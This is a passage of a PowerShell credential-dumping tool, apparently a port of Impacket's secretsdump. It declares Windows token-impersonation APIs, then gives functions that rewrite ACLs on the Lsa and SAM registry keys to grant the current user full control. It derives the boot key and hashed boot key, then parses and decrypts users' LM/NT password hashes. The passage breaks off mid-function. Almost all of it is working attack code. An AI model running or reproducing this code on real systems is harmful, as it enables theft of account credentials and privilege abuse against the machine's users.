	# OpenProcess()/CloseHandle()/EnumProcesses()/OpenProcessToken()
	# GetTokenInformation()/ConvertSidToStringSid()/LookupAccountSidW()
	# DuplicateTokenEx()/GetLastError()
	# CreateProcessWithTokenW()/SetThreadToken()
	# ProcessIdToSessionId()/SetTokenInformation()/CreateProcessAsUserW()/ImpersonateLoggedOnUser()
	# OpenWindowStationW()/OpenDesktopA()/GetSecurityInfo()/SetSecurityInfo()/CreateWellKnownSid()/SetEntriesInAclW()/LocalFree()
	# LsaGetLogonSessionData()
	If (-not ([System.Management.Automation.PSTypeName]'TokensAPI').Type)
	{
		Add-Type -TypeDefinition @'
		using System;
		using System.Text;
		using System.Runtime.InteropServices;

		public class TokensAPI
		{
			[Flags]
			public enum ProcessAccessFlags : uint
			{
				PROCESS_VM_READ = 0x00000010,
				PROCESS_QUERY_INFORMATION = 0x00000400,
				PROCESS_DUP_HANDLE = 0x0040,
				ALL = 0x001F0FFF
			}

			[Flags]
			public enum TOKEN_INFORMATION_CLASS
			{
				TokenUser = 1,
				TokenGroups,
				TokenPrivileges,
				TokenOwner,
				TokenPrimaryGroup,
				TokenDefaultDacl,
				TokenSource,
				TokenType,
				TokenImpersonationLevel,
				TokenStatistics,
				TokenRestrictedSids,
				TokenSessionId,
				TokenGroupsAndPrivileges,
				TokenSessionReference,
				TokenSandBoxInert,
				TokenAuditPolicy,
				TokenOrigin
			}

			[StructLayout(LayoutKind.Sequential)]
			public struct ACL
			{
				public byte AclRevision;
				public byte Sbz1;
				public Int16 AclSize;
				public Int16 AceCount;
				public Int16 Sbz2;
			}

			[StructLayout(LayoutKind.Sequential)]
			public struct TRUSTEE
			{
				public IntPtr pMultipleTrustee;
				public UInt32 MultipleTrusteeOperation;
				public UInt32 TrusteeForm;
				public UInt32 TrusteeType;
				public IntPtr ptstrName;
			}

			[StructLayout(LayoutKind.Sequential)]
			public struct EXPLICIT_ACCESS
			{
				public UInt32 grfAccessPermissions;
				public UInt32 grfAccessMode;
				public UInt32 grfInheritance;
				public TRUSTEE Trustee;
			}

			[StructLayout(LayoutKind.Sequential)]
			public struct TOKEN_USER
			{
				public SID_AND_ATTRIBUTES User;
			}

			[StructLayout(LayoutKind.Sequential)]
			public struct SID_AND_ATTRIBUTES
			{

				public IntPtr Sid;
				public int Attributes;
			}

			[StructLayout(LayoutKind.Sequential)]
			public struct SECURITY_ATTRIBUTES
			{
				public long nLength;
				public long lpSecurityDescriptor;
				public long bInheritHandle;
			}

			public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000;
			public const UInt32 STANDARD_RIGHTS_READ = 0x00020000;
			public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001;
			public const UInt32 TOKEN_DUPLICATE = 0x0002;
			public const UInt32 TOKEN_IMPERSONATE = 0x0004;
			public const UInt32 TOKEN_QUERY = 0x0008;
			public const UInt32 TOKEN_QUERY_SOURCE = 0x0010;
			public const UInt32 TOKEN_ADJUST_PRIVILEGES = 0x0020;
			public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040;
			public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080;
			public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100;
			public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY);
			public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
				TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
				TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
				TOKEN_ADJUST_SESSIONID);
			public const UInt32 ACCESS_SYSTEM_SECURITY = 0x01000000;
			public const UInt32 READ_CONTROL = 0x00020000;
			public const UInt32 WRITE_DAC = 0x00040000;
			public const UInt32 DESKTOP_GENERIC_ALL = 0x000F01FF;
			public const UInt32 DACL_SECURITY_INFORMATION = 0x4;
			public const UInt32 TRUSTEE_IS_SID = 0x0;
			public const UInt32 TRUSTEE_IS_WELL_KNOWN_GROUP = 0x5;
			public const UInt32 GRANT_ACCESS = 0x1;
			public const UInt32 OBJECT_INHERIT_ACE = 0x1;

			[Flags]
			public enum SID_NAME_USE
			{
				SidTypeUser = 1,
				SidTypeGroup,
				SidTypeDomain,
				SidTypeAlias,
				SidTypeWellKnownGroup,
				SidTypeDeletedAccount,
				SidTypeInvalid,
				SidTypeUnknown,
				SidTypeComputer
			}

			[Flags]
			public enum SECURITY_IMPERSONATION_LEVEL : uint
			{
				SecurityAnonymous = 0,
				SecurityIdentification = 1,
				SecurityImpersonation = 2,
				SecurityDelegation = 3
			}

			[Flags]
			public enum TOKEN_TYPE : uint
			{
				TokenPrimary		= 1,
				TokenImpersonation  = 2
			}

			[Flags]
			public enum LogonFlags
			{
				WithProfile = 1,
				NetCredentialsOnly
			}

			[Flags]
			public enum CreationFlags
			{
				DefaultErrorMode = 0x04000000,
				NewConsole = 0x00000010,
				NewProcessGroup = 0x00000200,
				SeparateWOWVDM = 0x00000800,
				Suspended = 0x00000004,
				UnicodeEnvironment = 0x00000400,
				ExtendedStartupInfoPresent = 0x00080000
			}

			[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
			public struct STARTUPINFO
			{
				public Int32 cb;
				public IntPtr lpReserved;
				public IntPtr lpDesktop;
				public IntPtr lpTitle;
				public Int32 dwX;
				public Int32 dwY;
				public Int32 dwXSize;
				public Int32 dwYSize;
				public Int32 dwXCountChars;
				public Int32 dwYCountChars;
				public Int32 dwFillAttribute;
				public Int32 dwFlags;
				public Int16 wShowWindow;
				public Int16 cbReserved2;
				public IntPtr lpReserved2;
				public IntPtr hStdInput;
				public IntPtr hStdOutput;
				public IntPtr hStdError;
			}

			[StructLayout(LayoutKind.Sequential)]
			public struct PROCESS_INFORMATION
			{
				public IntPtr hProcess;
				public IntPtr hThread;
				public int dwProcessId;
				public int dwThreadId;
			}

			[StructLayout(LayoutKind.Sequential)]
			public struct LUID
			{
				public Int32 LowPart;
				public Int32 HighPart;
			}

			[StructLayout(LayoutKind.Sequential)]
			public struct TOKEN_STATISTICS
			{
				public LUID TokenId;
				public LUID AuthenticationId;
				public UInt64 ExpirationTime;
				public TOKEN_TYPE TokenType;
				public SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
				public UInt32 DynamicCharged;
				public UInt32 DynamicAvailable;
				public UInt32 GroupCount;
				public UInt32 PrivilegeCount;
				public LUID ModifiedId;
			}

			[StructLayout(LayoutKind.Sequential)]
			public struct LSA_UNICODE_STRING
			{
				UInt16 Length;
				UInt16 MaximumLength;
				IntPtr Buffer;
			}

			[StructLayout(LayoutKind.Sequential)]
			public struct LARGE_INTEGER
			{
				Int64 QuadPart;
			}

			[StructLayout(LayoutKind.Sequential)]
			public struct LSA_LAST_INTER_LOGON_INFO
			{
				LARGE_INTEGER LastSuccessfulLogon;
				LARGE_INTEGER LastFailedLogon;
				UInt32 FailedAttemptCountSinceLastSuccessfulLogon;
			}

			[StructLayout(LayoutKind.Sequential)]
			public struct SECURITY_LOGON_SESSION_DATA
			{
				public UInt32 Size;
				public LUID LoginId;
				public LSA_UNICODE_STRING Username;
				public LSA_UNICODE_STRING LoginDomain;
				public LSA_UNICODE_STRING AuthenticationPackage;
				public UInt32 LogonType;
				public UInt32 Session;
				public IntPtr Sid;
				public LARGE_INTEGER LoginTime;
				public LSA_UNICODE_STRING LoginServer;
				public LSA_UNICODE_STRING DnsDomainName;
				public LSA_UNICODE_STRING Upn;
				public UInt32 UserFlags;
				public LSA_LAST_INTER_LOGON_INFO LastLogonInfo;
				public LSA_UNICODE_STRING LogonScript;
				public LSA_UNICODE_STRING ProfilePath;
				public LSA_UNICODE_STRING HomeDirectory;
				public LSA_UNICODE_STRING HomeDirectoryDrive;
				public LARGE_INTEGER LogoffTime;
				public LARGE_INTEGER KickOffTime;
				public LARGE_INTEGER PasswordLastSet;
				public LARGE_INTEGER PasswordCanChange;
				public LARGE_INTEGER PasswordMustChange;
			}

			public const UInt32 ERROR_INSUFFICIENT_BUFFER = 122;
			public const UInt32 ERROR_INVALID_SID = 1337;

			[DllImport("psapi.dll", SetLastError=true)]
			public static extern bool EnumProcesses(UInt32[] processIds, UInt32 arraySizeBytes, ref UInt32 bytesCopied);

			[DllImport("kernel32.dll")]
			public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
			[DllImport("kernel32.dll")]
			public static extern bool CloseHandle(IntPtr hObject);
			[DllImport("kernel32.dll")]
			public static extern bool ProcessIdToSessionId(uint dwProcessId, ref uint pSessionId);

			[DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
			public static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);
			[DllImport("advapi32.dll", SetLastError=true)]
			public static extern bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);
			[DllImport("advapi32", CharSet=CharSet.Auto, SetLastError=true)]
			public static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);
			[DllImport("advapi32.dll", CharSet=CharSet.Auto, SetLastError = true)]
			public static extern bool LookupAccountSidW(string lpSystemName, IntPtr Sid, StringBuilder lpName, ref uint cchName, StringBuilder ReferencedDomainName, ref uint cchReferencedDomainName, out SID_NAME_USE peUse);
			[DllImport("advapi32.dll", CharSet=CharSet.Auto, SetLastError=true)]
			public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, ref SECURITY_ATTRIBUTES lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, out IntPtr phNewToken);
			[DllImport("advapi32.dll", SetLastError = true)]
			public static extern bool SetThreadToken(IntPtr pHandle, IntPtr hToken);
			[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
			public static extern bool CreateProcessWithTokenW(IntPtr hToken, LogonFlags dwLogonFlags, IntPtr lpApplicationName, IntPtr lpCommandLine, CreationFlags dwCreationFlags, IntPtr lpEnvironment, IntPtr lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);
			[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
			public static extern bool SetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength);
			[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
			public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
			[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
			public static extern bool CreateProcessAsUserW(IntPtr hToken, IntPtr lpApplicationName, IntPtr lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, CreationFlags dwCreationFlags, IntPtr lpEnvironment, IntPtr lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);
			[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
			public static extern uint GetSecurityInfo(IntPtr handle, uint ObjectType, uint SecurityInfo, ref IntPtr ppsidOwner, ref IntPtr ppsidGroup, ref IntPtr ppDacl, ref IntPtr ppSacl, ref IntPtr ppSecurityDescriptor);
			[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
			public static extern uint SetSecurityInfo(IntPtr handle, uint ObjectType, uint SecurityInfo, IntPtr psidOwner, IntPtr psidGroup, IntPtr pDacl, IntPtr pSacl);
			[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
			public static extern bool CreateWellKnownSid(uint WellKnownSidType, IntPtr DomainSid, IntPtr pSid, ref uint cbSid);
			[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
			public static extern uint SetEntriesInAclW(uint cCountOfExplicitEntries, ref EXPLICIT_ACCESS pListOfExplicitEntries, IntPtr OldAcl, ref IntPtr NewAcl);

			[DllImport("User32.dll")]
			public static extern IntPtr OpenWindowStationW(IntPtr lpszWinSta, bool fInherit, uint dwDesiredAccess);
			[DllImport("User32.dll")]
			public static extern IntPtr OpenDesktopA(string lpszDesktop, uint dwFlags, bool fInherit, uint dwDesiredAccess);

			[DllImport("Kernel32.dll")]
			public static extern uint GetLastError();
			[DllImport("Kernel32.dll")]
			public static extern IntPtr LocalFree(IntPtr hMem);

			[DllImport("Secur32.dll")]
			public static extern uint LsaGetLogonSessionData(IntPtr LogonId, ref IntPtr ppLogonSessionData);
		}
'@
	}
}

<#####################################################################>
<#####################################################################>
<#                                                                   #>
<# THESE FUNCTIONS ARE INTERESTING FOR UNDERSTANDING WINDOWS SECRETS #>
<#                                                                   #>
<#####################################################################>
<#####################################################################>

<#######>
<# SAM #>
<#######>

<#
	Get-SAM:
		1- Get-BootKey
		2- Get-HBootKey with BootKey
		3- Parse SAM registry and decrypt/deobfuscate LM/NT hashes with BootKey and HashedBootKey
#>

function Get-BootKey
{
	<#
		Get-BootKey: Compute BootKey (or SysKey) from HKLM\SYSTEM\CurrentControlSet\Control\Lsa\JD|Skew1|GBG|Data
			1- Get concatenation of "Class" info from RegQueryInfoKey() from HKLM\SYSTEM\CurrentControlSet\Control\Lsa\JD|Skew1|GBG|Data
			2- Apply permutations with the following table [ 0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 ]
	#>

	Write-Host "`n[===] Retrieve Boot Key (or SysKey) [===]"

	# Set full control for registry "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" and subregistry/subkeys
	$SubKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SYSTEM\CurrentControlSet\Control\Lsa', 'ReadWriteSubTree', 'ChangePermissions')
	$ACL = $SubKey.GetAccessControl()
	$Rule = New-Object System.Security.AccessControl.RegistryAccessRule ([Security.Principal.WindowsIdentity]::GetCurrent().Name, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
	$ACL.SetAccessRule($Rule)
	$SubKey.SetAccessControl($ACL)

	# Concatenation of "Class" info from RegQueryInfoKey() from HKLM\SYSTEM\CurrentControlSet\Control\Lsa\JD|Skew1|GBG|Data
	$String = [String]::Join("", $("JD","Skew1","GBG","Data" | %{Get-RegKeyClass "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_"}))
	$Bytes = New-Object byte[] $($String.Length/2)
	0..$($Bytes.Length-1) | %{ $Bytes[$_] = [Convert]::ToByte($String.Substring($($_*2), 2), 16) }
	$BootKey = New-Object byte[] 16

	# Then string is permuted with the following table [ 0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 ]
	0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | % -begin{ $i=0 }{ $BootKey[$i]=$Bytes[$_]; $i++}

	# And we have the BootKey (or SysKey)
	$HexBootKey = [System.BitConverter]::ToString($BootKey).Replace("-", "")
	Write-Host ("[+] Boot Key = {0}" -f ($HexBootKey))

	# Remove ACL
	$Removed = $ACL.RemoveAccessRule($Rule)
	$SubKey.SetAccessControl($ACL)
	$SubKey.Close()

	return $BootKey
}

function Get-HBootKey($BootKey)
{
	<#
		Get-HBootKey: Compute Hashed BootKey from BootKey
			1- Get registry key "HKLM\SAM\SAM\Domains\Account\F"
			2- Parse registry key and extract Key0
			3- Depending on Windows version:
				3.1- Version 1
					- RC4Key = MD5 (Salt + AQWERTY + BootKey + ANUM)
					- Hashed BootKey = RC4Encrypt(RC4Key, Key + Checksum)
				3.2- Version 2 (This is Windows 2016 TP5 on in theory (it is reported that some W10 and 2012R2 might behave this way also), according to "secretsdump.py")
					- Hashed BootKey = AESDecrypt (BootKey, Data)
	#>

	Write-Host "`n[===] Compute Hashed Boot Key [===]"

	$AQWERTY = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0")
	$ANUM = [Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0")

	# Set full control for registry "HKLM\SAM\SAM\Domains\Account" and subregistry/subkeys
	$SubKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SAM\SAM\Domains\Account', 'ReadWriteSubTree', 'ChangePermissions')
	$ACL = $SubKey.GetAccessControl()
	$Rule = New-Object System.Security.AccessControl.RegistryAccessRule ([Security.Principal.WindowsIdentity]::GetCurrent().Name, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
	$ACL.SetAccessRule($Rule)
	$SubKey.SetAccessControl($ACL)

	# Get registry "HKLM\SAM\SAM\Domains\Account"
	$K = Get-Item HKLM:\SAM\SAM\Domains\Account

	If (-not $K)
	{
		Write-Error "Unable to retrieve registry 'HKLM:\SAM\SAM\Domains\Account'"
		return $Null
	}

	# We get the key "HKLM\SAM\SAM\Domains\Account\F"
	$DOMAIN_ACCOUNT_F = $K.GetValue("F")
	If (-not $DOMAIN_ACCOUNT_F)
	{
		Write-Error "Unable to retrieve key 'F' into registry 'HKLM:\SAM\SAM\Domains\Account'"
		return $Null
	}

	# Remove ACL
	$Removed = $ACL.RemoveAccessRule($Rule)
	$SubKey.SetAccessControl($ACL)
	$SubKey.Close()

	# Parse the key "HKLM\SAM\SAM\Domains\Account\F"
	# Structure from Impacket "secretsdump.py" : DOMAIN_ACCOUNT_F
	$Revision = $DOMAIN_ACCOUNT_F[0..3]
	$Unknown = $DOMAIN_ACCOUNT_F[4..7]
	$CreationTime = $DOMAIN_ACCOUNT_F[8..15]
	$DomainModifiedCount = $DOMAIN_ACCOUNT_F[16..23]
	$MaxPasswordAge = $DOMAIN_ACCOUNT_F[24..31]
	$MinPasswordAge = $DOMAIN_ACCOUNT_F[32..39]
	$ForceLogoff = $DOMAIN_ACCOUNT_F[40..47]
	$LockoutDuration = $DOMAIN_ACCOUNT_F[48..55]
	$LockoutObservationWindow = $DOMAIN_ACCOUNT_F[56..63]
	$ModifiedCountAtLastPromotion = $DOMAIN_ACCOUNT_F[64..71]
	$NextRid = $DOMAIN_ACCOUNT_F[72..75]
	$PasswordProperties = $DOMAIN_ACCOUNT_F[76..79]
	$MinPasswordLength = $DOMAIN_ACCOUNT_F[80..81]
	$PasswordHistoryLength = $DOMAIN_ACCOUNT_F[82..83]
	$LockoutThreshold = $DOMAIN_ACCOUNT_F[84..85]
	$Unknown2 = $DOMAIN_ACCOUNT_F[86..87]
	$ServerState = $DOMAIN_ACCOUNT_F[88..91]
	$ServerRole = $DOMAIN_ACCOUNT_F[92..93]
	$UasCompatibilityRequired = $DOMAIN_ACCOUNT_F[94..95]
	$Unknown3 = $DOMAIN_ACCOUNT_F[96..103]
	$Key0 = $DOMAIN_ACCOUNT_F[104..$($DOMAIN_ACCOUNT_F.Length-1)]
	# Commenting this, not needed and not present on Windows 2000 SP0
	# ('Key1',':', SAM_KEY_DATA)
	# ('Unknown4','<L=0')

	# Depending on Windows version : We have two type of structures of subpart Key0 from key "HKLM\SAM\SAM\Domains\Account\F"
	If ($Key0[0] -eq [byte]0x01)
	{
		# Structure from Impacket "secretsdump.py" : SAM_KEY_DATA
		$SAM_KEY_DATA = $Key0
		$Revision = $SAM_KEY_DATA[0..3]
		$Length = $SAM_KEY_DATA[4..7]
		$Salt = $SAM_KEY_DATA[8..23]
		$Key = $SAM_KEY_DATA[24..39]
		$CheckSum = $SAM_KEY_DATA[40..55]
		$Reserved = $SAM_KEY_DATA[56..63]

		# RC4Key = MD5 (Salt + AQWERTY + BootKey + ANUM)
		# Hashed BootKey = RC4Encrypt(RC4Key, Key + Checksum)
		$RC4Key = [Security.Cryptography.MD5]::Create().ComputeHash($Salt + $AQWERTY + $BootKey + $ANUM)
		$HBootKey = (NewRC4 $RC4Key).Transform($Key + $CheckSum)
		$NewCheckSum = [Security.Cryptography.MD5]::Create().ComputeHash($HBootKey[0..15] + $ANUM + $HBootKey[0..15] + $AQWERTY)

		If (@(Compare-Object $NewCheckSum $HBootKey[16..$($HBootKey.Length-1)] -SyncWindow 0).Length -ne 0)
		{
			Write-Error "Hashed BootKey checksum failed, Syskey startup password probably in use"
			return $Null
		}

		Write-Host ("[+] Hashed Boot Key = {0}" -f ([System.BitConverter]::ToString($HBootKey).Replace("-", "")))
		return $HBootKey
	}
	# Else : This is Windows 2016 TP5 on in theory (it is reported that some W10 and 2012R2 might behave this way also), according to "secretsdump.py"
	ElseIf ($Key0[0] -eq [byte]0x02)
	{
		# Structure from Impacket "secretsdump.py" : SAM_KEY_DATA_AES
		$SAM_KEY_DATA_AES = $Key0
		$Revision = $SAM_KEY_DATA_AES[0..3]
		$Length = $SAM_KEY_DATA_AES[4..7]
		$CheckSumLen = $SAM_KEY_DATA_AES[8..11]
		$DataLen = $SAM_KEY_DATA_AES[12..15]
		$Salt = $SAM_KEY_DATA_AES[16..31]
		$Data = $SAM_KEY_DATA_AES[32..$($SAM_KEY_DATA_AES.Length-1)]

		# Hashed BootKey = AESDecrypt (BootKey, Data, Salt)
		$HBootKey = AESTransform $BootKey $Data[0..$([BitConverter]::ToUInt32($DataLen, 0) - 1)] $Salt ([Security.Cryptography.CipherMode]::CBC) $False

		Write-Host ("[+] Hashed Boot Key = {0}" -f ([System.BitConverter]::ToString($HBootKey).Replace("-", "")))
		return $HBootKey
	}
	Else
	{
		Write-Error '"F" key from "HKLM\SAM\SAM\Domains\Account" registry parsing error'
		return $Null
	}
}

function Get-UsersKeys
{
	<#
		Get-UsersKeys: Retrieve users' LM/NT Hashes encrypted/obfuscated (structure USER_ACCOUNT_V) into registry key "HKLM\SAM\SAM\Domains\Account\Users\<RID>\V"
			1- Get users' LM/NT Hashes encrypted/obfuscated (structure USER_ACCOUNT_V) into registry key "HKLM\SAM\SAM\Domains\Account\Users\<RID>\V"
	#>

	$UsersKeys = @()

	# Set full control for registry "HKLM\SAM\SAM\Domains\Account\Users" and subregistry/subkeys
	$SubKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SAM\SAM\Domains\Account\Users', 'ReadWriteSubTree', 'ChangePermissions')
	$ACL = $SubKey.GetAccessControl()
	$Rule = New-Object System.Security.AccessControl.RegistryAccessRule ([Security.Principal.WindowsIdentity]::GetCurrent().Name, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
	$ACL.SetAccessRule($Rule)
	$SubKey.SetAccessControl($ACL)

	ForEach ($Child in $(Get-ChildItem HKLM:\SAM\SAM\Domains\Account\Users))
	{
		If ($Child.PSChildName -match "^[0-9A-Fa-f]{8}$")
		{
			$UserKey = @{}
			$V = $Child.GetValue("V")

			# Structure from Impacket "secretsdump.py" : USER_ACCOUNT_V
			$UserKey['Unknown'] = $V[0..11]
			$UserKey['NameOffset'] = $V[12..15]
			$UserKey['NameLength'] = $V[16..19]
			$UserKey['Unknown2'] = $V[20..23]
			$UserKey['FullNameOffset'] = $V[24..27]
			$UserKey['FullNameLength'] = $V[28..31]
			$UserKey['Unknown3'] = $V[32..35]
			$UserKey['CommentOffset'] = $V[36..39]
			$UserKey['CommentLength'] = $V[40..43]
			$UserKey['Unknown3'] = $V[44..47]
			$UserKey['UserCommentOffset'] = $V[48..51]
			$UserKey['UserCommentLength'] = $V[52..55]
			$UserKey['Unknown4'] = $V[56..59]
			$UserKey['Unknown5'] = $V[60..71]
			$UserKey['HomeDirOffset'] = $V[72..75]
			$UserKey['HomeDirLength'] = $V[76..79]
			$UserKey['Unknown6'] = $V[80..83]
			$UserKey['HomeDirConnectOffset'] = $V[84..87]
			$UserKey['HomeDirConnectLength'] = $V[88..91]
			$UserKey['Unknown7'] = $V[92..95]
			$UserKey['ScriptPathOffset'] = $V[96..99]
			$UserKey['ScriptPathLength'] = $V[100..103]
			$UserKey['Unknown8'] = $V[104..107]
			$UserKey['ProfilePathOffset'] = $V[108..111]
			$UserKey['ProfilePathLength'] = $V[112..115]
			$UserKey['Unknown9'] = $V[116..119]
			$UserKey['WorkstationsOffset'] = $V[120..123]
			$UserKey['WorkstationsLength'] = $V[124..127]
			$UserKey['Unknown10'] = $V[128..131]
			$UserKey['HoursAllowedOffset'] = $V[132..135]
			$UserKey['HoursAllowedLength'] = $V[136..139]
			$UserKey['Unknown11'] = $V[140..143]
			$UserKey['Unknown12'] = $V[144..155]
			$UserKey['LMHashOffset'] = $V[156..159]
			$UserKey['LMHashLength'] = $V[160..163]
			$UserKey['Unknown13'] = $V[164..167]
			$UserKey['NTHashOffset'] = $V[168..171]
			$UserKey['NTHashLength'] = $V[172..175]
			$UserKey['Unknown14'] = $V[176..179]
			$UserKey['Unknown15'] = $V[180..203]
			$UserKey['Data'] = $V[204..$($V.Length-1)]

			$UserKey["PSChildName"] = $Child.PSChildName
			$UsersKeys += , $UserKey
		}
	}

	# Remove ACL
	$Removed = $ACL.RemoveAccessRule($Rule)
	$SubKey.SetAccessControl($ACL)
	$SubKey.Close()

	return $UsersKeys
}

function Get-UserHashesDeobfuscated($UserKey, $HBootKey, $RID)
{
	<#
		Get-UserHashesDeobfuscated: Deobfuscate single UserKey = LM/NT Hashes encrypted/obfuscated (structure USER_ACCOUNT_V) and decrypt them
			1- Get-HBootKey with BootKey
			2- Get LM/NT hashes, from $UserKey["Data"] = LM/NT Hashes encrypted/obfuscated (structure USER_ACCOUNT_V), depending on Windows version:
				2.1- If < Windows 10 v1607
					- From structure SAM_HASH get potential LM/NT hashes encrypted/obfuscated
				2.2- If >= Windows 10 v1607
					- From structure SAM_HASH_AES get potential LM/NT hashes encrypted/obfuscated
			3- Compute DES keys from user's RID
			4- Decrypt LM/NT hashes encrypted/obfuscated, depending on Windows version:
				4.1- If < Windows 10 v1607
					- RC4Key_LM/NT = MD5 (HashedBootKey[0:0x10] + RID + ALMPASSWORD/ANTPASSWORD)
					- Obf_LMHash/NTHash = RC4Encrypt (RC4Key_LM/NT, Enc_LMHash/NTHash)
				4.2- If >= Windows 10 v1607
					- Obf_LMHash/NTHash = AESDecrypt (HashedBootKey[0:0x10], Enc_LMHash/NTHash, SAM_HASH_AES_LM/NT[Salt])[0:0x10]
			5- Deobfuscate LMHash/NTHash = DESDecrypt (DESKeys[0], Obf_LMHash/NTHash[0:8]) + DESDecrypt (DESKeys[1], Obf_LMHash/NTHash[8:16])
	#>

	# Constants
	$ALMPASSWORD = [Text.Encoding]::ASCII.GetBytes("LMPASSWORD`0");
	$ANTPASSWORD = [Text.Encoding]::ASCII.GetBytes("NTPASSWORD`0");
	$emptyLM = [byte[]]@(0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee);
	$emptyNT = [byte[]]@(0x31,0xd6,0xcf,0xe0,0xd1,0x6a,0xe9,0x31,0xb7,0x3c,0x59,0xd7,0xe0,0xc0,0x89,0xc0);

	If ($HBootKey)
	{
		[byte[]]$Enc_LMHash = $Null
		[byte[]]$Enc_NTHash = $Null

		# Retrieve encrypted hashes depending Windows versions
		# Old style = < Windows 10 v1607
		# New style = >= Windows 10 v1607
		$NewStyle = $False
		If ($UserKey["Data"][[BitConverter]::ToUInt32($UserKey["NTHashOffset"], 0) + 2] -eq [byte]0x01)
		{
			# Old style hashes
			If ([BitConverter]::ToUInt32($UserKey["LMHashLength"], 0) -eq 20)
			{
				# LM Hash have been setted
				# Structure from Impacket "secretsdump.py" : SAM_HASH
				$LMHashOffset = [BitConverter]::ToUInt32($UserKey["LMHashOffset"], 0)
				$LMHashLength = [BitConverter]::ToUInt32($UserKey["LMHashLength"], 0)
				$SAM_HASH_LM = $UserKey["Data"][$LMHashOffset..$(($LMHashOffset + $LMHashLength)-1)]
				$PekID_LM = $SAM_HASH_LM[0..1]
				$Revision_LM = $SAM_HASH_LM[2..3]
				$Enc_LMHash = $SAM_HASH_LM[4..$($SAM_HASH_LM.Length - 1)]

			}
			If ([BitConverter]::ToUInt32($UserKey["NTHashLength"], 0) -eq 20)
			{
				# NT Hash have been setted
				# Structure from Impacket "secretsdump.py" : SAM_HASH
				$NTHashOffset = [BitConverter]::ToUInt32($UserKey["NTHashOffset"], 0)
				$NTHashLength = [BitConverter]::ToUInt32($UserKey["NTHashLength"], 0)
				$SAM_HASH_NT = $UserKey["Data"][$NTHashOffset..$(($NTHashOffset + $NTHashLength)-1)]
				$PekID_NT = $SAM_HASH_NT[0..1]
				$Revision_NT = $SAM_HASH_NT[2..3]
				$Enc_NTHash = $SAM_HASH_NT[4..$($SAM_HASH_NT.Length - 1)]
			}
		}
		Else
		{
			# New style hashes
			$NewStyle = $True
			If ([BitConverter]::ToUInt32($UserKey["LMHashLength"], 0) -gt 24)
			{
				# LM Hash have been setted
				# Structure from Impacket "secretsdump.py" : SAM_HASH_AES
				$LMHashOffset = [BitConverter]::ToUInt32($UserKey["LMHashOffset"], 0)
				$LMHashLength = [BitConverter]::ToUInt32($UserKey["LMHashLength"], 0)
				$SAM_HASH_AES_LM = $UserKey["Data"][$LMHashOffset..$(($LMHashOffset + $LMHashLength)-1)]
				$PekID_LM = $SAM_HASH_AES_LM[0..1]
				$Revision_LM = $SAM_HASH_AES_LM[2..3]
				$DataOffset_LM = $SAM_HASH_AES_LM[4..7]
				$Salt_LM = $SAM_HASH_AES_LM[8..23]
				$Enc_LMHash = $SAM_HASH_AES_LM[24..$($SAM_HASH_AES_LM.Length - 1)]
			}
			If ([BitConverter]::ToUInt32($UserKey["NTHashLength"], 0) -gt 24)
			{
